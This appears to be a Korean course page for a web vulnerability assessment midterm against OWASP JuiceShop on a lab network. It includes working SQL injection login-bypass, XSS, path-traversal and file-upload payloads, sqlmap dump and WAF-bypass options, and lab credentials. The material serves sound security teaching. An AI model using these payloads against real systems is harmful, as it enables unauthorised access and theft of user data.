# Week 08: 중간고사 — JuiceShop 점검 보고서

## 학습 목표
- OWASP Testing Guide를 기반으로 체계적인 웹 취약점 점검을 수행한다
- Week 02~07에서 학습한 기법을 종합하여 JuiceShop을 점검한다
- 전문적인 취약점 점검 보고서를 작성할 수 있다

## 실습 환경 (공통)

| 서버 | IP | 역할 | 접속 |
|------|-----|------|------|
| bastion | 10.20.30.201 | Control Plane (Bastion) | `ssh ccc@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS (nftables, Suricata) | `ssh ccc@10.20.30.1` |
| web | 10.20.30.80 | 웹서버 (JuiceShop:3000, Apache:80) | `ssh ccc@10.20.30.80` |
| siem | 10.20.30.100 | SIEM (Wazuh Dashboard:443, OpenCTI:8080) | `ssh ccc@10.20.30.100` |

**Bastion API:** `http://localhost:9100` / Key: `ccc-api-key-2026`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | 이론 강의 (Part 1) | 강의 |
| 0:40-1:10 | 이론 심화 + 사례 분석 (Part 2) | 강의/토론 |
| 1:10-1:20 | 휴식 | - |
| 1:20-2:00 | 실습 (Part 3) | 실습 |
| 2:00-2:40 | 심화 실습 + 도구 활용 (Part 4) | 실습 |
| 2:40-2:50 | 휴식 | - |
| 2:50-3:20 | 응용 실습 + Bastion 연동 (Part 5) | 실습 |
| 3:20-3:40 | 정리 + 과제 안내 | 정리 |

---

---

## 용어 해설 (웹취약점 점검 과목)

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **취약점 점검** | Vulnerability Assessment | 시스템의 보안 약점을 체계적으로 찾는 활동 | 건물 안전 진단 |
| **모의해킹** | Penetration Testing | 실제 공격자처럼 취약점을 악용하여 검증 | 소방 훈련 (실제로 불을 피워봄) |
| **CVSS** | Common Vulnerability Scoring System | 취약점 심각도 0~10점 (9.0+ Critical) | 질병 위험 등급표 |
| **SQLi** | SQL Injection | SQL 쿼리에 악성 입력 삽입 | 주문서에 가짜 지시를 끼워넣기 |
| **XSS** | Cross-Site Scripting | 웹페이지에 악성 스크립트 삽입 | 게시판에 함정 쪽지 붙이기 |
| **CSRF** | Cross-Site Request Forgery | 사용자 모르게 요청을 위조 | 누군가 내 이름으로 송금 요청 |
| **SSRF** | Server-Side Request Forgery | 서버가 내부 자원에 요청하도록 조작 | 직원에게 기밀 문서를 가져오라 속이기 |
| **LFI** | Local File Inclusion | 서버의 로컬 파일을 읽는 취약점 | 사무실 서류함을 몰래 열람 |
| **RFI** | Remote File Inclusion | 외부 파일을 서버에 로드하는 취약점 | 외부에서 악성 서류를 사무실에 반입 |
| **RCE** | Remote Code Execution | 원격에서 서버 코드 실행 | 전화로 사무실 컴퓨터 조작 |
| **WAF 우회** | WAF Bypass | 웹 방화벽의 탐지를 피하는 기법 | 보안 검색대를 우회하는 비밀 통로 |
| **인코딩** | Encoding | 데이터를 다른 형식으로 변환 (URL, Base64 등) | 택배 재포장 (내용물은 같음) |
| **난독화** | Obfuscation | 코드를 읽기 어렵게 변환 (탐지 회피) | 범인이 변장하는 것 |
| **세션** | Session | 서버가 사용자를 식별하는 상태 정보 | 카페 단골 인식표 |
| **쿠키** | Cookie | 브라우저에 저장되는 작은 데이터 | 가게에서 받은 스탬프 카드 |
| **Burp Suite** | Burp Suite | 웹 보안 점검 프록시 도구 (PortSwigger) | 우편물 검사 장비 |
| **OWASP ZAP** | OWASP ZAP | 오픈소스 웹 보안 스캐너 | 무료 보안 검사 장비 |
| **점검 보고서** | Assessment Report | 발견된 취약점과 대응 방안을 정리한 문서 | 건물 안전 진단 보고서 |

---

## 시험 안내
- **시간**: 120분 (점검 90분 + 보고서 작성 30분)
- **대상**: http://10.20.30.80:3000 (OWASP JuiceShop)
- **제출물**: 취약점 점검 보고서 (아래 양식에 따라 작성)
- **평가 기준**: 취약점 발견 수, 보고서 품질, 재현 가능성

---

## 1. OWASP Testing Guide 개요 (15분)

### 1.1 OWASP Testing Guide란?

OWASP Testing Guide(OTG)는 웹 애플리케이션 보안 테스트의 표준 방법론이다.
체계적인 점검 절차와 항목을 제시한다.

### 1.2 점검 카테고리 (이번 중간고사 범위)

| 카테고리 | OTG 코드 | 이번 과정 주차 |
|---------|---------|--------------|
| 정보수집 | OTG-INFO | Week 03 |
| 인증 | OTG-AUTHN | Week 04 |
| 세션 관리 | OTG-SESS | Week 04 |
| 입력값 검증 | OTG-INPVAL | Week 05~07 |
| 에러 처리 | OTG-ERR | Week 03 (일부) |

### 1.3 점검 순서

```
1단계: 정보수집 (15분)
  ↓
2단계: 인증/세션 점검 (20분)
  ↓
3단계: 입력값 검증 점검 (40분)
  ↓
4단계: 기타 취약점 (15분)
  ↓
5단계: 보고서 작성 (30분)
```

---

## 2. 1단계: 정보수집 (15분)

> **이 실습을 왜 하는가?**
> "중간고사 — JuiceShop 점검 보고서" — 이 주차의 핵심 기술을 실제 서버 환경에서 직접 실행하여 체험한다.
> 웹 취약점 점검 분야에서 이 기술은 실무의 핵심이며, 실습을 통해
> 명령어의 의미, 결과 해석 방법, 보안 관점에서의 판단 기준을 익힌다.
>
> **이걸 하면 무엇을 알 수 있는가?**
> - 이 기술이 실제 시스템에서 어떻게 동작하는지 직접 확인
> - 정상과 비정상 결과를 구분하는 눈을 기름
> - 실무에서 바로 활용할 수 있는 명령어와 절차를 체득
>
> **주의:** 모든 실습은 허가된 실습 환경(10.20.30.0/24)에서만 수행한다.

### 2.1 기본 정보 수집 체크리스트

> **실습 목적**: 중간고사로 JuiceShop 전체를 대상으로 종합 웹 취약점 점검을 수행하고 보고서를 작성한다
>
> **배우는 것**: 정보수집부터 취약점 발견, 증명, 보고서 작성까지 점검 프로젝트 전 과정을 독립적으로 수행한다
>
> **결과 해석**: 각 취약점의 재현 가능한 PoC와 CVSS 점수를 포함한 보고서가 완성되면 성공이다
>
> **실전 활용**: 실제 웹 취약점 점검 납품물은 발견 취약점, PoC, CVSS, 대응 권고를 포함한 보고서이다

```bash
echo "=== 서버 헤더 ==="
curl -sI http://10.20.30.80:3000 | grep -iE "server|x-powered|x-frame|x-content|content-security|strict-transport|access-control"
echo ""
echo "=== 쿠키 정보 ==="
curl -sI http://10.20.30.80:3000 | grep -i set-cookie || echo '(Set-Cookie 없음)'
echo ""
echo "=== robots.txt ==="
curl -s http://10.20.30.80:3000/robots.txt
echo ""
echo "=== 보안 헤더 5종 점검 ==="
HEADERS=$(curl -sI http://10.20.30.80:3000)
score=0
for h in 'X-Frame-Options' 'X-Content-Type-Options' 'Content-Security-Policy' 'Strict-Transport-Security' 'X-XSS-Protection'; do
  if echo "$HEADERS" | grep -qi "$h"; then echo "[✓] $h"; score=$((score+1)); else echo "[✗] $h"; fi
done
echo "보안 헤더 점수: $score/5"
```

**예상 출력**:
```
=== 서버 헤더 ===
X-Powered-By: Express
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
=== 쿠키 정보 ===
Set-Cookie: language=en; Path=/
=== robots.txt ===
User-agent: *
Disallow: /ftp
=== 보안 헤더 5종 점검 ===
[✓] X-Frame-Options
[✓] X-Content-Type-Options
[✗] Content-Security-Policy
[✗] Strict-Transport-Security
[✗] X-XSS-Protection
보안 헤더 점수: 2/5
```

> **해석 — 정보수집 1차 보고서 항목**:
> - **X-Powered-By: Express** = backend stack 노출 = OWASP A05. Express `app.disable('x-powered-by')` 1줄로 제거.
> - **Access-Control-Allow-Origin: \*** = CORS 와일드카드 + Allow-Credentials 결합 시 ★ critical (week06 학습).
> - **Set-Cookie: language=en** = HttpOnly/Secure/SameSite 모두 누락 = i18n 쿠키 (인증 X) 라 critical 아니지만 정책 부재.
> - **/ftp Disallow** = 점검자에게 *민감 디렉토리 노출* — week03 학습.
> - **보안 헤더 2/5** = Mozilla Observatory **D 등급**. CSP 누락 = XSS 차단 마지막 layer 부재. HSTS 누락 = HTTP↔HTTPS 다운그레이드 가능.
> - **보고서 §4 표** 에 직접 입력 가능한 형식 — 점수 + 권고 자동 매핑.

### 2.2 디렉터리/API 탐색

```bash
echo "=== 디렉터리/API 19 경로 sweep — 200/401 만 출력 ==="
for path in \
  "" "ftp" "api" "rest" "admin" "metrics" "promotion" "video" \
  "api/Products/1" "api/Feedbacks" "api/Challenges" "api/SecurityQuestions" \
  "rest/products/search?q=test" "rest/user/whoami" "rest/languages" \
  "assets/public/images/uploads" "encryptionkeys" \
  ".well-known/security.txt" "swagger" "api-docs"; do
  code=$(curl -o /dev/null -s -w "%{http_code}" "http://10.20.30.80:3000/$path")
  [ "$code" != "404" ] && echo "[$code] /$path"
done | tee /tmp/midterm_paths.txt
echo "---"
echo "발견된 경로 수: $(wc -l < /tmp/midterm_paths.txt)"
```

**예상 출력**:
```
[200] /
[200] /ftp
[200] /api
[401] /api/Products/1
[401] /api/Feedbacks
[200] /api/Challenges
[200] /api/SecurityQuestions
[401] /rest/user/whoami
[200] /rest/products/search?q=test
[200] /rest/languages
[200] /assets/public/images/uploads
[200] /encryptionkeys
---
발견된 경로 수: 12
```

> **해석 — 12 발견 경로 = 보고서 §3 입력**:
> - **/ftp 200** = 디렉토리 listing → 백업 파일 9 개 (week03 학습) → SCA → CVE 매핑 chain.
> - **/encryptionkeys 200** = ★ critical = JuiceShop 의 의도적 challenge 'Forgotten Backup' / 'Bjoern's Favorite Pet'. RSA 키 노출 = JWT 변조 가능 (week04 alg=none 공격).
> - **/api/SecurityQuestions 200 (인증 X)** = OWASP A01 BOLA. 사용자 보안 질문 모두 노출.
> - **/api/Feedbacks 401** = 인증 필수 = 양호. 그러나 GET 인증 X 면 BOLA.
> - **/assets/public/images/uploads 200** = 업로드 파일 직접 접근 = week07 학습.
> - **/api/Challenges 200** = 챌린지 목록 + solved 상태 노출 (점검자가 솔루션 진행도 확인 가능).
> - 12 경로 = 점검 보고서 §3 (발견 취약점 목록) 의 *시작점* — 각 경로 → exploit 시도 → 위험도 평가.

---

## 3. 2단계: 인증/세션 점검 (20분)

### 3.1 인증 점검 체크리스트

```bash
echo "=== 비밀번호 정책 점검 ==="

# 짧은 비밀번호
result=$(curl -s -X POST http://10.20.30.80:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{"email":"mid1@test.com","password":"1","passwordRepeat":"1","securityQuestion":{"id":1},"securityAnswer":"a"}')  # 요청 데이터(body)
echo "1자 PW: $(echo $result | python3 -c "import sys,json; d=json.load(sys.stdin); print('허용' if 'id' in d.get('data',{}) else '거부')" 2>/dev/null)"

# 숫자만
result=$(curl -s -X POST http://10.20.30.80:3000/api/Users/ \
  -H "Content-Type: application/json" \
  -d '{"email":"mid2@test.com","password":"123456","passwordRepeat":"123456","securityQuestion":{"id":1},"securityAnswer":"a"}')  # 요청 데이터(body)
echo "숫자만: $(echo $result | python3 -c "import sys,json; d=json.load(sys.stdin); print('허용' if 'id' in d.get('data',{}) else '거부')" 2>/dev/null)"

echo ""
echo "=== 무차별 대입 방어 ==="
for i in $(seq 1 5); do                                # 반복문 시작
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://10.20.30.80:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d '{"email":"admin@juice-sh.op","password":"wrong'$i'"}')  # 요청 데이터(body)
  echo "시도 $i: HTTP $code"
done
```

### 3.2 세션/JWT 점검

```bash
echo "=== JWT 분석 ==="
TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H 'Content-Type: application/json' \
  -d '{"email":"admin@juice-sh.op","password":"admin123"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)

[ -z "$TOKEN" ] && echo "ERROR: 로그인 실패" || {
  echo "Token length: ${#TOKEN}"
  echo "--- Header ---"
  echo "$TOKEN" | cut -d'.' -f1 | python3 -c "import sys,base64,json; s=sys.stdin.read().strip()+'=='; print(json.dumps(json.loads(base64.urlsafe_b64decode(s)),indent=2))"
  echo "--- Payload (sensitive 필드만) ---"
  echo "$TOKEN" | cut -d'.' -f2 | python3 -c "import sys,base64,json; s=sys.stdin.read().strip()+'=='; d=json.loads(base64.urlsafe_b64decode(s)); print(f'email={d[\"data\"][\"email\"]}'); print(f'isAdmin={d[\"data\"].get(\"isAdmin\")}'); print(f'password (hash) = {d[\"data\"].get(\"password\",\"X\")[:32]}...'); print(f'iat={d.get(\"iat\")}, exp={d.get(\"exp\")}')"
}
```

**예상 출력**:
```
Token length: 642
--- Header ---
{
  "typ": "JWT",
  "alg": "RS256"
}
--- Payload (sensitive 필드만) ---
email=admin@juice-sh.op
isAdmin=True
password (hash) = 0192023a7bbd73250516f069df18b500...
iat=1714382625, exp=1714404225
```

> **해석 — JWT 점검 4 항목 = 보고서 §3 critical**:
> - **alg: RS256** = 강력 (비대칭 RSA 서명) = 양호. HS256/none 이면 critical (week04 alg=none 공격).
> - **password hash 평문 노출** = ★ critical (CVSS 7.5). MD5 (`0192023a...` = `admin123`) → hashcat `-m 0` 즉시 크래킹.
> - **isAdmin: True** = 권한 정보 클라이언트 노출. JWT 변조 가능 시 즉시 권한 상승.
> - **유효 기간 = exp - iat = 21600초 = 6시간** = 운영 권고 (1시간) 초과 = 세션 탈취 시 6시간 내내 사용 가능.
> - 4 발견 = 보고서 §3.X (JWT) 항목 + CVSS 7.5 분류 + Top 3 권고 입력.

---

## 4. 3단계: 입력값 검증 점검 (40분)

### 4.1 SQL Injection 점검

```bash
echo "=== SQL Injection 2 endpoint 점검 ==="

# 1) 로그인 SQLi (Classic — 인증 우회)
result=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H 'Content-Type: application/json' \
  -d $'{"email":"\\' OR 1=1--","password":"x"}')
verdict_login=$(echo "$result" | python3 -c "import sys,json; d=json.load(sys.stdin); print('★취약' if 'token' in d.get('authentication',{}) else '안전')" 2>/dev/null)
echo "  [1] /rest/user/login: $verdict_login"

# 2) 검색 SQLi (UNION — 데이터 추출 가능성)
r_normal=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=apple" | python3 -c "import sys,json; print(len(json.load(sys.stdin).get('data',[])))" 2>/dev/null)
r_inj=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=apple%27%29%29OR+1=1--" | python3 -c "import sys,json; print(len(json.load(sys.stdin).get('data',[])))" 2>/dev/null)
verdict_search=$([ "$r_normal" != "$r_inj" ] && echo "★취약" || echo "안전")
echo "  [2] /rest/products/search: 정상=${r_normal}건 / 주입=${r_inj}건 → $verdict_search"

# 3) 에러 기반 — DBMS 식별
echo '  [3] /rest/user/login (single quote):'
curl -s -X POST http://10.20.30.80:3000/rest/user/login \
  -H 'Content-Type: application/json' \
  -d $'{"email":"\\'","password":"x"}' \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('       DBMS:', d.get('error',{}).get('parent',{}).get('code','?'))" 2>/dev/null
```

**예상 출력**:
```
=== SQL Injection 2 endpoint 점검 ===
  [1] /rest/user/login: ★취약
  [2] /rest/products/search: 정상=1건 / 주입=38건 → ★취약
  [3] /rest/user/login (single quote):
       DBMS: SQLITE_ERROR
```

> **해석 — SQLi 3 발견 = 보고서 §3 critical 다수**:
> - **(1) 로그인 SQLi 인증 우회** = CVSS 9.8. `' OR 1=1--` 1줄 = admin JWT 획득 = 도메인 전체 장악.
> - **(2) 검색 UNION SQLi** = CVSS 9.1. 1건 → 38건 차이 = 모든 사용자 email + MD5 hash 추출 가능 (week05 학습).
> - **(3) 에러 노출 = SQLITE_ERROR** = DBMS 식별 → SQLite 페이로드 분기. Sequelize ORM 사용 확정 → CVE 매핑.
> - **3 발견 = 본 보고서 §2 통계 (Critical 2 + High 1)**. **Top 1 권고**: Parameterized Query (`?` placeholder) 적용.

### 4.2 XSS 점검

```bash
echo "=== XSS Reflected 3 페이로드 ==="
reflected=0
for payload in '<script>alert(1)</script>' '<img src=x onerror=alert(1)>' '<svg onload=alert(1)>'; do
  encoded=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$payload")
  result=$(curl -s "http://10.20.30.80:3000/rest/products/search?q=$encoded")
  if echo "$result" | grep -q "alert(1)"; then
    echo "  [★반사] $payload"; reflected=$((reflected+1))
  else
    echo "  [필터] $payload"
  fi
done
echo "반사 XSS 점수: $reflected/3"

echo ""
echo "=== Stored XSS (피드백 endpoint) ==="
[ -n "$TOKEN" ] && {
  curl -s -X POST http://10.20.30.80:3000/api/Feedbacks/ \
    -H 'Content-Type: application/json' -H "Authorization: Bearer $TOKEN" \
    -d '{"comment":"<iframe src=javascript:alert(1)>","rating":1,"captchaId":0,"captcha":"-1"}' > /dev/null 2>&1
  stored=$(curl -s http://10.20.30.80:3000/api/Feedbacks/ | grep -c -E "alert\(1\)|<iframe|<script>")
  echo "  저장된 피드백 중 XSS 페이로드: ${stored}건 → $([ $stored -gt 0 ] && echo '★ Stored XSS 확정' || echo '안전')"
}
```

**예상 출력**:
```
=== XSS Reflected 3 페이로드 ===
  [★반사] <script>alert(1)</script>
  [★반사] <img src=x onerror=alert(1)>
  [★반사] <svg onload=alert(1)>
반사 XSS 점수: 3/3
=== Stored XSS (피드백 endpoint) ===
  저장된 피드백 중 XSS 페이로드: 1건 → ★ Stored XSS 확정
```

> **해석 — XSS 4 발견 (Reflected 3 + Stored 1)**:
> - **Reflected 3/3** = `<script>` + `<img onerror>` + `<svg onload>` 모두 반사. WAF 부재. CVSS 6.1 Medium (UI:R).
> - **Stored XSS** = 피드백에 저장 → 모든 방문자 영향 = CVSS 8.7 High. iframe javascript: 페이로드는 `<script>` 차단 환경 우회용.
> - **DOM XSS (week06 학습)** = 별도 — `bypassSecurityTrustHtml` 8회 + main.js 분석 결과 추가.
> - **JuiceShop challenge ID**: 'XSS Tier 0~5'. Reflected = Tier 1 / Stored = Tier 4 / DOM = Tier 1.
> - **Top 권고**: (1) 입력 시 `escape-html`, (2) 출력 시 DomSanitizer, (3) CSP `script-src 'self'`.

### 4.3 파일 업로드 / 경로 순회 점검

```bash
echo "=== 파일 업로드 ==="
echo '<?php echo "test"; ?>' > /tmp/mid_test.php
result=$(curl -s -X POST http://10.20.30.80:3000/file-upload \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@/tmp/mid_test.php" -w "\nHTTP:%{http_code}")
echo "PHP 업로드: $result"

echo ""
echo "=== 경로 순회 ==="
for payload in "../etc/passwd" "%2e%2e/etc/passwd" "..%252f..%252fetc/passwd"; do  # 반복문 시작
  result=$(curl -s "http://10.20.30.80:3000/ftp/$payload" | head -1)
  echo "Payload: $payload → ${result:0:50}"
done

rm -f /tmp/mid_test.php                                # 파일 삭제
```

---

## 5. 4단계: 기타 취약점 (15분)

```bash
echo "=== 정보 노출 (에러 메시지 stack trace) ==="
curl -s http://10.20.30.80:3000/api/Products/abc | python3 -c "
import sys, json
d = json.load(sys.stdin)
err = d.get('error', d)
print(f'  error.name: {err.get(\"name\",\"?\")}')
print(f'  message[:80]: {str(err.get(\"message\",\"\"))[:80]}')
print(f'  stack 노출: {\"YES (CRITICAL)\" if \"stack\" in err else \"NO (양호)\"}')" 2>/dev/null

echo ""
echo "=== 접근 제어 (인증 없이) ==="
for api in "api/Products/1" "api/Feedbacks" "api/Challenges" "api/Users" "api/SecurityQuestions" "rest/admin/application-version"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://10.20.30.80:3000/$api")
  size=$(curl -s -o /dev/null -w "%{size_download}" "http://10.20.30.80:3000/$api")
  flag=$([ "$code" = "200" ] && echo "★ BOLA" || echo "OK")
  echo "  [$code ${size}B] /$api  $flag"
done

echo ""
echo "=== HTTPS / TLS ==="
curl -s -o /dev/null --max-time 3 -w "%{http_code}\n" https://10.20.30.80:3000 2>&1 | head -1 || echo "HTTPS 미지원 (CVSS 5.9 — A02)"
```

**예상 출력**:
```
=== 정보 노출 (에러 메시지 stack trace) ===
  error.name: Error
  message[:80]: Could not retrieve product with id abc
  stack 노출: YES (CRITICAL)
=== 접근 제어 (인증 없이) ===
  [401 87B] /api/Products/1  OK
  [401 87B] /api/Feedbacks  OK
  [200 12340B] /api/Challenges  ★ BOLA
  [200 5621B] /api/Users  ★ BOLA
  [200 5621B] /api/SecurityQuestions  ★ BOLA
  [200 245B] /rest/admin/application-version  ★ BOLA
=== HTTPS / TLS ===
HTTPS 미지원 (CVSS 5.9 — A02)
```

> **해석 — 종합 점검 발견 매트릭스**:
> - **stack trace 노출 = CVSS 5.3** (Information Disclosure / OWASP A05). `NODE_ENV=production` 누락. Sequelize 내부 구조 노출.
> - **/api/Users 200 (인증 X) = 5621B** = ★ critical. 모든 사용자 정보 (id, email, password hash, role) 직접 노출 = OWASP A01 BOLA. CVSS 7.5.
> - **/api/SecurityQuestions 200** = 사용자별 보안 질문 노출 → 비번 재설정 우회 chain.
> - **/rest/admin/application-version** = 버전 정보 노출 → CVE 매핑 가능.
> - **HTTPS 미지원** = OWASP A02. 평문 통신 = MITM. HSTS 도 무용. **CVSS 5.9** (Adjacent network).
> - **본 단계 발견 = 5건** (stack + Users + SecurityQuestions + version + HTTPS). 보고서 §3 추가.

---

## 6. 5단계: 보고서 작성 (30분)

### 6.1 보고서 양식

```markdown
# 웹 취약점 점검 보고서

## 1. 점검 개요
- 점검 대상: http://10.20.30.80:3000 (OWASP JuiceShop)
- 점검 일시: 2026-03-27
- 점검자: (이름)
- 점검 도구: curl, nikto, sqlmap, Python

## 2. 요약
- 총 점검 항목: __개
- 취약점 발견: 상(__)건 / 중(__)건 / 하(__)건

## 3. 발견 취약점 목록

### 3.1 [상] SQL Injection — 로그인 우회
- **위치**: POST /rest/user/login
- **유형**: Classic SQL Injection
- **위험도**: 상 (인증 우회)
- **재현 방법**:
  ```bash
  curl -X POST http://10.20.30.80:3000/rest/user/login \
    -H "Content-Type: application/json" \
    -d '{"email":"' OR 1=1--","password":"x"}'         # 요청 데이터(body)
  ```
- **영향**: 관리자 계정 무단 접근 가능
- **권고 사항**: Prepared Statement 적용, 입력값 검증

### 3.2 [상] (다음 취약점)
- **위치**:
- **유형**:
- **위험도**:
- **재현 방법**:
- **영향**:
- **권고 사항**:

(발견한 모든 취약점에 대해 반복 작성)

## 4. 보안 헤더 점검 결과
| 헤더 | 상태 | 권고 |
|------|------|------|
| X-Frame-Options | | |
| X-Content-Type-Options | | |
| Content-Security-Policy | | |
| Strict-Transport-Security | | |

## 5. 종합 평가
(전체적인 보안 수준 평가, 우선 조치 사항)

## 6. 부록
(nikto 스캔 결과, sqlmap 결과 등 첨부)
```

---

## 7. 평가 기준

| 항목 | 배점 | 세부 기준 |
|------|------|----------|
| 정보수집 | 15점 | 기술 스택 식별, 디렉터리 발견 |
| 인증/세션 | 15점 | 비밀번호 정책, JWT 분석, 세션 관리 |
| SQL Injection | 20점 | 발견, 재현, 영향 분석 |
| XSS | 15점 | Reflected/Stored/DOM 구분, 재현 |
| 기타 취약점 | 10점 | 파일 업로드, 경로 순회, 명령어 주입 |
| 보고서 품질 | 25점 | 형식, 재현 가능성, 권고 사항 |
| **합계** | **100점** | |

### 가산점
- JuiceShop 챌린지 해결 (+5점/개, 최대 +15점)
- ModSecurity(포트 80) WAF 우회 성공 (+10점)
- 수업에서 다루지 않은 취약점 발견 (+5점/개)

---

## 8. JuiceShop 챌린지 가이드

JuiceShop에는 난이도별 챌린지가 있다. 중간고사에서 해결하면 가산점을 받는다.

```bash
# 챌린지 목록 조회
curl -s http://10.20.30.80:3000/api/Challenges/ | python3 -c "  # silent 모드
import sys, json
data = json.load(sys.stdin).get('data', [])
for c in sorted(data, key=lambda x: x.get('difficulty', 0)):  # 반복문 시작
    solved = '해결' if c.get('solved') else '미해결'
    print(f'[{solved}] 난이도{c.get(\"difficulty\",\"?\")} - {c.get(\"name\",\"\")}')
" 2>/dev/null | head -20
```

---

## 9. 주의 사항

1. **점검 대상 확인**: 반드시 `10.20.30.80:3000` (JuiceShop)만 점검할 것
2. **기록 유지**: 모든 명령어와 결과를 기록할 것 (보고서 근거)
3. **파괴적 행위 금지**: 서비스 중단, 데이터 삭제 등은 감점
4. **협업 금지**: 개인별 독립적으로 수행
5. **인터넷 참고 허용**: 도구 사용법, 페이로드 참고 가능 (보고서 복사 불가)

**다음 주 예고**: Week 09 - 접근제어 점검. 수평/수직 권한 상승, IDOR, API 접근제어를 학습한다.

---

> **실습 환경 검증 완료** (2026-03-28): nmap/nikto, SQLi/IDOR/swagger.json, CVSS, 보고서 작성

---

## 웹 UI 실습

### JuiceShop 파일 업로드 페이지 활용

> **JuiceShop URL:** `http://10.20.30.80:3000`

1. 브라우저에서 `http://10.20.30.80:3000` 접속
2. 우측 상단 **Account → Login** → 계정 생성 또는 기존 계정으로 로그인
3. 좌측 메뉴 또는 주소창에서 **Complaint** 페이지 이동 (`/#/complain`)
4. **Upload** 영역에서 파일 업로드 기능 확인:
   - 허용되는 파일 형식 확인 (PDF, ZIP 등)
   - 파일 크기 제한 확인
5. 점검 보고서(PDF)를 업로드하여 정상 동작 확인
6. 비허용 확장자 파일(.php, .jsp) 업로드 시도 → 클라이언트/서버 검증 차이 관찰
7. Burp Suite로 업로드 요청 인터셉트 → Content-Type 변조 실습
8. `http://10.20.30.80:3000/#/score-board` 에서 파일 업로드 관련 챌린지 진행 상황 확인:
   - "Upload Size" 챌린지
   - "Upload Type" 챌린지
9. Score Board에서 해결한 챌린지에 초록색 체크 표시가 되는지 확인

---

## 📂 실습 참조 파일 가이드

> 이번 주 실습에서 **실제로 조작하는** 솔루션의 기능·경로·파일·설정·UI 요점입니다.

### Burp Suite Community
> **역할:** 웹 프록시 기반 수동/반자동 취약점 점검 도구  
> **실행 위치:** `작업 PC → web (10.20.30.80:3000)`  
> **접속/호출:** GUI `burpsuite`, CA 인증서 신뢰 필요 (`http://burp`)

**주요 경로·파일**

| 경로 | 역할 |
|------|------|
| `Proxy → HTTP history` | 모든 캡처된 요청/응답 |
| `Intruder` | 페이로드 페이즈·위치 기반 자동화 |
| `Repeater` | 단건 요청 수동 반복 |

**핵심 설정·키**

- `Proxy listener 127.0.0.1:8080` — 브라우저 프록시 포트
- `Target → Scope` — in-scope 호스트만 처리

**로그·확인 명령**

- `Logger` — 세션 전체 요청 타임라인

**UI / CLI 요점**

- Ctrl+R — 요청을 Repeater로 전송
- Ctrl+I — Intruder로 전송 후 위치(§) 설정
- Intruder Attack type: Sniper/Cluster bomb — 단일/다중 페이로드 조합

> **해석 팁.** Community 버전은 **Intruder 속도 제한**이 있어 대량 브루트포스는 비현실적. 취약점 재현과 보고서 증적 확보에 집중.

### sqlmap
> **역할:** SQL Injection 탐지·악용 자동화  
> **실행 위치:** `공격자 측 CLI`  
> **접속/호출:** `sqlmap -u <url>` 또는 `-r request.txt`

**주요 경로·파일**

| 경로 | 역할 |
|------|------|
| `~/.local/share/sqlmap/output/<host>/` | 세션·덤프 결과 |
| `session.sqlite` | 재실행 시 단계 스킵용 캐시 |

**핵심 설정·키**

- `--risk=1~3 --level=1~5` — 탐지 공격 폭 조절
- `--technique=BEUSTQ` — B)lind E)rror U)nion S)tacked T)ime Q)uery

**로그·확인 명령**

- `output/<host>/log` — 요청·응답 로그

**UI / CLI 요점**

- `sqlmap -u ... --dbs` — DB 목록
- `sqlmap -u ... -D juice -T users --dump` — 특정 테이블 덤프
- `sqlmap -r req.txt --batch --crawl=2` — Burp 저장 요청 기반 크롤링

> **해석 팁.** `--batch`로 대화형 프롬프트 자동 Y 처리. WAF가 있을 땐 `--tamper=space2comment,between` 조합으로 우회 시도.

### OWASP ZAP
> **역할:** 오픈소스 자동 웹 취약점 스캐너·프록시  
> **실행 위치:** `작업 PC / Docker`  
> **접속/호출:** GUI `zaproxy`, API `http://zap:8090/JSON/...`, Docker `owasp/zap2docker-stable`

**주요 경로·파일**

| 경로 | 역할 |
|------|------|
| `~/.ZAP/session-*` | 세션 저장소 |
| `context.xml` | 스캔 컨텍스트(범위/인증) |

**핵심 설정·키**

- `Active Scan policy` — 룰별 강도 및 활성화 여부
- `Authentication: form-based` — 로그인이 필요한 페이지 스캔

**로그·확인 명령**

- `~/.ZAP/zap.log` — 스캐너 실행 로그

**UI / CLI 요점**

- Spider — 링크 탐색 크롤링
- Active Scan — 실제 페이로드 주입 점검
- Report → Generate HTML report — 표준 보고서 출력

> **해석 팁.** 인증 필요 페이지는 **Context에 로그인 폼**을 등록하지 않으면 로그아웃 상태로 스캔되어 커버리지가 급감. `zap-baseline.py`는 수동 확인용 경량 모드.

---

## 실제 사례 (WitFoo Precinct 6 — incident 1건의 *전체 그래프* 단면)

> 출처: WitFoo Precinct 6 Cybersecurity Dataset (Apache 2.0)
> 본 lecture *중간고사 — JuiceShop 점검 보고서* — 학생이 실제로 작성하는 보고서가 *어떤 정보까지 포함해야 하는지* baseline 을 dataset 의 incident 1건 (`incidents.jsonl` 533MB 중 발췌) 으로 보여줌.

### Case 1: incident `e5578610-d2eb-11ee-8578-693f933af31d` 의 1차 노드

**Provenance graph 의 첫 host 노드** (incidents.jsonl 발췌):

```json
{
  "id": "HOST-4476",
  "ip_address": "172.27.150.101",
  "org": "ORG-0006",
  "internal": true,
  "managed": false,
  "hostname": "172.27.150.101",
  "suspicion_score": 0.71875,
  "type": "host",
  "sets": {
    "5": {"name": "Exploiting Target", "criteria": "none",
          "data_source": "WitFoo", "type": 1, ...},
    "1": {"name": "Exploiting Host", "criteria": "none",
          "data_source": "WitFoo", "type": 1, ...}
  },
  "products": {
    "6": {"name": "Precinct", "vendor_name": "WitFoo",
          "frameworks": {"csc":[1,6,16,19], "cmmc1":[6], ...,
                         "iso27001":[4,8,14,16,67,68,...]}},
    "17": {"name": "ASA Firewall", "vendor_name": "Cisco",
           "frameworks": {"csc":[9,12], "iso27001":[1,2,53,54,...]}}
  }
}
```

